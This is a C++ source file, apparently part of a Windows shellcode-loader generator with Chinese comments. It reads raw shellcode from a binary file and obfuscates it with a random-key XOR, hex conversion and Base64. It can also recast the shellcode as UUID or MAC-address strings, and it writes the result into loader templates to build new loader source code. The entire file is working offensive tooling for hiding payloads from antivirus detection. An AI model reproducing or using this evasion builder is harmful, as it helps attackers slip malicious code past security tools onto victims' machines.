#include "pch.h"

#include "CLoaderShellCode.h"
#include<time.h>
#include<stdlib.h>
#include <Windows.h>
#include <rpcdce.h>
#include <sstream>

#pragma comment(lib, "Rpcrt4.lib")

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

CLoaderShellCode::CLoaderShellCode()
{
}

CLoaderShellCode::~CLoaderShellCode()
{
}

string& CLoaderShellCode::GetShellCode()
{
	return m_strShellCode;
}

bool CLoaderShellCode::FileToLoadCode(const char* szFileName)
{
	//打开bin文件
	ifstream fShellCode;
	fShellCode.open(szFileName, ios_base::in | std::ios::binary);
	if(!fShellCode.is_open())
	{
		return false;
	}
	//读取shellcode
	char szBuf[MAXWORD];
	fShellCode.read(szBuf, sizeof(szBuf));

	//获取文件大小
	struct stat statbuf;
	stat(szFileName, &statbuf);
	size_t nFileSize = statbuf.st_size;

	for (size_t i = 0; i < nFileSize; ++i)
	{
		m_strShellCode += szBuf[i];
	}
	
	fShellCode.close();
	return true;
}

void CLoaderShellCode::XOREncode()
{
	srand(unsigned (time(NULL)));	//设置随机种子
	char cKey = rand() % 255;			//获取key

	//cKey = '\x84';
	//异或加密
	string strTmp;
	unsigned int nLen = m_strShellCode.size();
	for (unsigned int i = 0; i < nLen; ++i)
	{
		char cTmp = (0xff - m_strShellCode[i]) ^ cKey;
		strTmp += cTmp;
	}

	//保存加密shellcode和key
	m_strShellCode = strTmp;
	m_strShellCode += cKey;
}

void CLoaderShellCode::XORDncode()
{
	string input = m_strShellCode;

	int nLen = input.size();
	int nKey = (int)input[nLen - 1];
	std::string output;
	for (int i = 0; i < nLen - 1; ++i)
	{
		int nTmp = (int)input[i];
		int n1 = 0xff - (nTmp ^ nKey);
		char cTmp = (char)n1;
		output += cTmp;
	}
	m_strShellCode = output;
}

void CLoaderShellCode::HexToString()
{
	std::string output;
	size_t len = m_strShellCode.length();
	map<unsigned int, char> char_to_int = {
	{0x0,'0'},{0x1,'1'},{0x2,'2'},{0x3,'3'},
	{0x4,'4'},{0x5,'5'},{0x6,'6'},{0x7,'7'},
	{0x8,'8'},{0x9,'9'},{0xa,'a'},{0xb,'b'},
	{0xc,'c'},{0xd,'d'},{0xe,'e'},{0xf,'f'}
	};

	for (unsigned int i = 0; i < len; i++)
	{
		if((unsigned int)(m_strShellCode[i]) < 0x10)
		{
			output += char_to_int[0x0];
			output += char_to_int[m_strShellCode[i]];
			continue;
		}

		unsigned char c1 = (unsigned char)m_strShellCode[i] % 0x10;
		unsigned char c2 = ((unsigned char)m_strShellCode[i] - c1) / 0x10;
		output += char_to_int[c2];
		output += char_to_int[c1];
	}

	m_strShellCode = output;
}

void CLoaderShellCode::StringToHex()
{
	std::string output;
	size_t len = m_strShellCode.length();

	map<char, unsigned int> char_to_int = {
	{'0',0x0},{'1',0x1},{'2',0x2},{'3',0x3},
	{'4',0x4},{'5',0x5},{'6',0x6},{'7',0x7},
	{'8',0x8},{'9',0x9},{'a',0xa},{'b',0xb},
	{'c',0xc},{'d',0xd},{'e',0xe},{'f',0xf}
	};

	for (unsigned int i = 0; i < len; i++)
	{
		unsigned int n1 = char_to_int[m_strShellCode[i]] * 0x10;
		i++;
		unsigned int n2 = char_to_int[m_strShellCode[i]];
		unsigned int n = n1 + n2;
		char c = (char)n;
		output += c;
	}

	m_strShellCode = output;
}

void CLoaderShellCode::Base64Encode()
{
	std::string ret;
	int i = 0;
	int j = 0;
	unsigned char char_array_3[3];
	unsigned char char_array_4[4];

	int in_len = m_strShellCode.size();
	char const* bytes_to_encode = m_strShellCode.data();

	while (in_len--) {
		char_array_3[i++] = *(bytes_to_encode++);
		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (i = 0; (i < 4); i++)
				ret += base64_chars[char_array_4[i]];
			i = 0;
		}
	}

	if (i)
	{
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;

		for (j = 0; (j < i + 1); j++)
			ret += base64_chars[char_array_4[j]];

		while ((i++ < 3))
			ret += '=';

	}

	m_strShellCode = ret;

}

void CLoaderShellCode::Base64Decode()
{
	string encoded_string = m_strShellCode;
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && Isbase64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = i; j < 4; j++)
			char_array_4[j] = 0;

		for (j = 0; j < 4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}
	m_strShellCode = ret;
}

void CLoaderShellCode::RestoreShellCode()
{
	Base64Decode();
	StringToHex();
	XORDncode();
}

map<int, string> CLoaderShellCode::UUIDEncode()
{
	map<int, string> list;

	//补充0
	string strShellCode = m_strShellCode;
	uint32_t nLen = strShellCode.size();
	uint32_t nFill = 16 - (nLen % 16);
	for (uint32_t i = 0; i < nFill; ++i)
	{
		UCHAR cFill = 0x00;
		strShellCode += cFill;
	}

	//把Hex的shellcode转换为字符shellcode
	uint32_t nUuidCount = strShellCode.size() / 16;
	for (uint32_t i = 0; i < nUuidCount; ++i)
	{
		UCHAR szBuf[16];
		RPC_CSTR struuid;
		for (int j = 0; j < 16; ++j)
		{
			szBuf[j] = (&strShellCode[i * 16])[j];
		}
		
		UuidToStringA((UUID*)szBuf, &struuid);
		list[i] = (char*)struuid;
	}

	m_listTmp = list;

	return list;
}

map<int, string> CLoaderShellCode::MACEncode()
{
	map<int, string> list;

	//补充0
	string strShellCode = m_strShellCode;
	uint32_t nLen = strShellCode.size();
	uint32_t nFill = 12 - (nLen % 12);
	for (uint32_t i = 0; i < nFill; ++i)
	{
		UCHAR cFill = '0';
		strShellCode += cFill;
	}

	//把字符的shellcode转换为MACshellcode
	uint32_t nUuidCount = strShellCode.size() / 12;
	for (uint32_t i = 0; i < nUuidCount; ++i)
	{
		UCHAR szBuf[18];
		int n = 0;
		for (int j = 0; j < 12; ++j)
		{
			szBuf[n++] = (&strShellCode[i * 12])[j++];
			szBuf[n++] = (&strShellCode[i * 12])[j];
			szBuf[n++] = '-';
		}
		szBuf[17] = 0x00;
		list[i] = (char*)szBuf;
	}

	m_listTmp = list;
	return list;
}

void CLoaderShellCode::Encode()
{
	XOREncode();
	HexToString();
	Base64Encode();
}

bool CLoaderShellCode::CreateMAC()
{
	Encode();
	bool bRes = CreateTmp("TemplateMAC");
	RestoreShellCode();
	return  bRes;
}


bool CLoaderShellCode::CreateUUID()
{
	Encode();
	bool bRes = CreateTmp("TemplateUUID");
	RestoreShellCode();
	return  bRes;
}

bool CLoaderShellCode::CreateRMM()
{
	Encode();
	bool bRes = CreateTmp("TemplateRMM");
	RestoreShellCode();
	return  bRes;
}

bool CLoaderShellCode::CreateREG()
{
	Encode();
	bool bRes = CreateTmp("TemplateREG");
	RestoreShellCode();
	return  bRes;
}

bool CLoaderShellCode::CreateTmp(const string strTmpName)
{
	if (!IsLoad())
	{
		return false;
	}

	ofstream fShellCode("result/ShellCode.txt", ios::out);

	//格式化字符

	stringstream sstrFromt;
	sstrFromt << "string shellcode = \"" << m_strShellCode << "\";";
	string&& strFromt = sstrFromt.str();
	fShellCode << strFromt << endl;

	fShellCode.close();

	string strTmp1 = "LoadTemplate/" + strTmpName + "1.cpp";
	string strTmp2 = "LoadTemplate/" + strTmpName + "2.cpp";
	string strTmp3 = "result/" + strTmpName + ".cpp";

	string filename[3] = { strTmp1,"result/ShellCode.txt", strTmp2 };

	ofstream outfile(strTmp3, ios::out);//定义输出文件流对象，并赋初值，指定模式
	ifstream infile;//定义一个输入文件流对象
	char c;//用来暂存从文件独处的一个字符

	for (string Temp_FileName : filename) {
		infile.open(Temp_FileName, ios::in);
		if (!infile) {
			throw("打开模板失败");
		}
		while (infile.get(c)) {
			outfile << c;
		}
		infile.close();
	}
	outfile.close();
	remove("result/ShellCode.txt");
	return true;
}




bool CLoaderShellCode::Isbase64(unsigned char c)
{
	return (isalnum(c) || (c == '+') || (c == '/'));
}

bool CLoaderShellCode::IsLoad()
{
	return m_strShellCode.size();
}

string CLoaderShellCode::LoadTemplate()
{
	//打开bin文件
	ifstream fShellCode;
	fShellCode.open("LoadTemplate/TemplateMAC.cpp", ios_base::in);
	if (!fShellCode.is_open())
	{
		throw("打开模板失败");
	}
	string strLoad;

	char buf[MAXWORD];

	fShellCode >> buf;

	strLoad = buf;


	fShellCode.close();

	return strLoad;
}
